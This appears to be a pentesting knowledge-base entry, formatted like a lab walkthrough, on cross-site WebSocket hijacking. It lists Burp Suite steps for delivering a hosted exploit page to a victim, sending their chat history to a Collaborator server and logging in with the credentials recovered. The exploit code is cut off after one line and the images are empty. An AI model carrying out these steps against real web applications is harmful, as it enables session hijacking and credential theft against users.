---
id: 52c8110c-5aaf-4bce-ace5-90252bea4155
name: Cross Site Web Socket Hijacking
type: procedure
verified: true
submitted: true
created_at: '2020-08-22T13:07:06.713350+00:00'
updated_at: '2023-05-26T01:10:13.986881+00:00'
platforms:
- Web
tags:
- '[[cross site web socket hijacking]]'
- '[[Web Applications]]'
- '[[web sockets]]'
---

# Cross Site Web Socket Hijacking

**Status**: ✓ Verified

## Summary

When the web socket handshake relies on http cookies to handle session  without implementing CSRF tokens, it is possible for an attacker to perform unauthorised actions impersonating the victim. 

## Description

# Description

When the web socket handshake relies on http cookies to handle session  without implementing CSRF tokens, it is possible for an attacker to perform unauthorised actions impersonating the victim.

# Instructions



1. Observe the live chat on the application.





![514fbf89-2367-4d86-ae0b-f9b0013a70ce.png]()





2.Under Burp proxy , in the web sockets history ,observe that ready command retreives the past chat messages from the server . Identify the web socket handshake and send it to the repeater.







![e92d9240-ef97-41a8-9f20-c17b2ce5d2f7.png]()





3. Use Burp Suite professional to start the burp collaborator client and click on copy to *clipboard*







![de9a4b68-cf3b-4f45-8434-7bdc3e6c939f.png]()



4. Craft a exploit in the similar way as below and host it on the server. Deliver this exploit to the victim. Change the URL in the web socket handshake from step 2 to the crafted url generated here.









**Code**: [[<script>
websocket = new WebSocket('wss://your-we]]





5. Click on poll now to generate responses from the application server. Observe the HTTP reqeusts and responses in the collaborator window.





![3f025bc8-8aca-4999-895e-0cd691559216.png]()





6. Decode the url from the response in the collaborator window using decoder tab in burp suite. Login into the application with the credentials obtained from decoder.





![e3722e59-4127-4f9e-af6d-724356d3057c.png]()



## Platforms

- Web

## Tags

- [[cross site web socket hijacking]]
- [[Web Applications]]
- [[web sockets]]


